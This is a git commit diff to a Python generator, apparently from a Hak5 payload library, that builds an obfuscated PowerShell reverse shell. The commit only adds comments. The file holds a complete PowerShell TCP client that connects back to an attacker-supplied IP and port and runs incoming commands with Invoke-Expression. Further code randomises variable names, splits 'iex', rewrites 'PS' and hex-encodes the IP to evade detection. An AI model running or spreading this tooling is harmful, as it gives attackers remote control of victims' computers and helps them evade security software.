79f6c854677c53f58afc0d1348fd2583da1097b7
Peaks <115900893+hak5peaks@users.noreply.github.com>
2025-02-05 12:59:59 -0500

    Update shell.py
    adding comments and docs

--- payloads/library/execution/PolyWog-Shell/shell.py
+++ payloads/library/execution/PolyWog-Shell/shell.py
@@ -1,25 +1,31 @@
+# PolyWog Shell generator 
+# Usage: python2 shell.py $IP $PORT
 
 import re
 import string
 import random
 import sys
 
-ip = sys.argv[1]
-port = sys.argv[2]
+ip = sys.argv[1] # Arguement that are passed fom payload.txt for IP
+port = sys.argv[2] # Arguement that are passed fom payload.txt for Port
 
 script = """$tcp=New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream=$tcp.GetStream();$reader=New-Object System.IO.StreamReader($stream);$writer=New-Object System.IO.StreamWriter($stream,[System.Text.Encoding]::UTF8);$writer.AutoFlush=$true;while($tcp.Connected){$data=$reader.ReadLine();if($data){try{$result=Invoke-Expression $data;if($result -is [System.Collections.IEnumerable]){$result=($result | ForEach-Object {$_.Name}) -join "`n"}$writer.WriteLine($result);$writer.Flush()}catch{ $writer.WriteLine("Error: $_");$writer.Flush()}}}"""
+# Orginal powershell revshell. 
 var_dict = {}
 pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z][A-Za-z0-9]+)')
-def replace_var(match):
+
+# Variable name randomization. 
+def replace_var(match): 
     var_name = match.group(1)
     if var_name not in var_dict:
         var_dict[var_name] = '$' + ''.join(random.sample(string.ascii_letters + string.digits, 10))
     return var_dict[var_name]
 
 script = pattern.sub(replace_var, script)
+# Replace variable names. 
 
-pattern = re.compile(r'\biex\b')
-script = pattern.sub("i''ex", script)
+pattern = re.compile(r'\biex\b') # Replace iex 
+script = pattern.sub("i''ex", script) # Replace iex 
 
 pattern = re.compile(r'\bPS\b')
 def replace_ps(match):
@@ -27,12 +33,12 @@ def replace_ps(match):
 
 script = pattern.sub(replace_ps, script)
 
-script = script.replace("*LHOST*", ip)
-script = script.replace("*LPORT*", port)
+script = script.replace("*LHOST*", ip) # Insert sys argument for IP 
+script = script.replace("*LPORT*", port) # Insert sys argument for Port
 
 pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
 def ip_to_hex(match):
-    return '0x' + ''.join('{:02x}'.format(int(x)) for x in match.group(0).split('.'))
+    return '0x' + ''.join('{:02x}'.format(int(x)) for x in match.group(0).split('.')) # Convert IP and Port to hex
 
 script = pattern.sub(ip_to_hex, script)
 
